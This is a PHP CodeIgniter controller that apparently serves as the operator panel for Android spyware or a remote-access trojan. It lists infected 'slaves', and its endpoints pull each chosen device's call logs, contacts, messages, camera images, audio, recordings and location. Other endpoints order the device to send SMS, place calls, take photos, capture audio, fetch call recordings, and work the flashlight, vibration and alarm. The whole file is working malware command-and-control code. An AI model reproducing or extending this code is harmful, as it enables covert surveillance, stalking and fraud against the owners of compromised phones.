<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class User extends CI_Controller {


	public function User(){
        parent::__construct();
        parse_str( $_SERVER['QUERY_STRING'], $_REQUEST );

		if($this->session->userdata('isLogged')==0)
    	{

				redirect("home/login");

		}
		else
		{

     	 	$this->load->model('model');
       		$left= $this->model->forceLogout();


        }



    }
	public function index()
	{	$this->load->model('model');
		$data=array("slaves"=>$this->model->getSlaves());
		$this->load->view('user/header',$data);
		$this->load->view('user/cpanel');
		$this->load->view('user/footer');
	}
	public function logout()
	{
		$this->session->sess_destroy();
		redirect("home/login");
	}


	public function dashboard(){


		$this->load->model('model');
		$this->load->view('user/dashboard');


	}

	public function calllogs(){


		$this->load->model('model');
		$data=array("array"=>$this->model->getCalls($this->input->get('device')));
		$this->load->view('user/calllogs',$data);


	}


	public function refreshcalllogs(){


		$this->load->model('model');
		$data=array("array"=>$this->model->refreshCalls($this->input->get('device')));
		$this->load->view('user/calllogs',$data);



	}

	public function contacts(){
		$this->load->model('model');
		$data=array("array"=>$this->model->getContacts($this->input->get('device')));
		$this->load->view('user/contacts',$data);


	}

	public function refreshcontacts(){


		$this->load->model('model');
		$data=array("array"=>$this->model->refreshContacts($this->input->get('device')));
		$this->load->view('user/contacts',$data);



	}

	public function messages(){
		$this->load->model('model');
		$data=array("array"=>$this->model->getMessages($this->input->get('device')));
		$this->load->view('user/messages',$data);



	}

		public function refreshmessages(){


		$this->load->model('model');
		$data=array("array"=>$this->model->refreshMessages($this->input->get('device')));
		$this->load->view('user/messages',$data);


	}

		public function camera(){
				$this->load->model('model');
				$data=array("array"=>$this->model->getCamera($this->input->get('device')));
				$this->load->view('user/camera',$data);


	}
		public function audio(){
				$this->load->model('model');
				$data=array("array"=>$this->model->getCamera($this->input->get('device')));
				$this->load->view('user/audio',$data);


	}

	public function recordings(){


		$this->load->model('model');
		$data=array("array"=>$this->model->getCamera($this->input->get('device')));
		$this->load->view('user/recordings',$data);


	}
		public function files(){
				$this->load->model('model');
				$this->load->view('user/files');


	}

		public function refreshcamera(){


		$this->load->model('model');
		$data=array("array"=>$this->model->refreshCamera($this->input->get('device')));
		$this->load->view('user/camera',$data);


	}

	public function location(){
		$this->load->model('model');
		$data=array("array"=>$this->model->getLocation($this->input->get('device')));
		$this->load->view('user/location',$data);


	}
		public function refreshlocation(){


		$this->load->model('model');
		$data=array("array"=>$this->model->refreshLocation($this->input->get('device')));
		$this->load->view('user/location',$data);


	}

	public function extras(){
		$this->load->model('model');
		$data=array("device"=>$this->model->getDevice($this->input->get('device')));
		$this->load->view('user/extras',$data);
		// $this->load->view('user/javascript');

	}

	public function sendSMS(){
				$this->load->model('model');
					$this->load->library('form_validation');

		$this->form_validation->set_rules('number','number','required');

		$this->load->model('model');


            if($this->form_validation->run()){


          $bool=$this->model->sendSMS($this->input->post('device'),$this->input->post('number'),$this->input->post('message'));

            }



	}

	public function makeCall(){
				$this->load->model('model');
								$this->load->library('form_validation');

		$this->form_validation->set_rules('number','number','required|integer');
	    $this->form_validation->set_rules('device','device','required');
	    $this->form_validation->set_error_delimiters('', '');
	    $this->form_validation->set_message('number', 'Error Message');

		$this->load->model('model');


            if($this->form_validation->run()){


$bool=$this->model->makeCall($this->input->post('device'),$this->input->post('number'));

}
echo  validation_errors();



	}

		public function flashLight(){
				$this->load->model('model');
				$bool=$this->model->flashLight($this->input->post('device'),$this->input->post('message'));


	}

		public function vibratePhone(){
				$this->load->model('model');
				$bool=$this->model->vibratePhone($this->input->post('device'),$this->input->post('message'));


	}


		public function alarm(){
				$this->load->model('model');
				$bool=$this->model->alarm($this->input->post('device'),$this->input->post('message'));


	}
	public function takePhoto(){
				$this->load->model('model');
				$bool=$this->model->takePhoto($this->input->post('device'),$this->input->post('message'));


	}

		public function captureAudio(){
				$this->load->model('model');
				$bool=$this->model->captureAudio($this->input->post('device'),$this->input->post('message'));


	}
	public function getCallRecordings(){


		$this->load->model('model');
		$bool=$this->model->getCallRecordings($this->input->post('device'),$this->input->post('message'));


	}

}

/* End of file welcome.php */
/* Location: ./application/controllers/welcome.php */
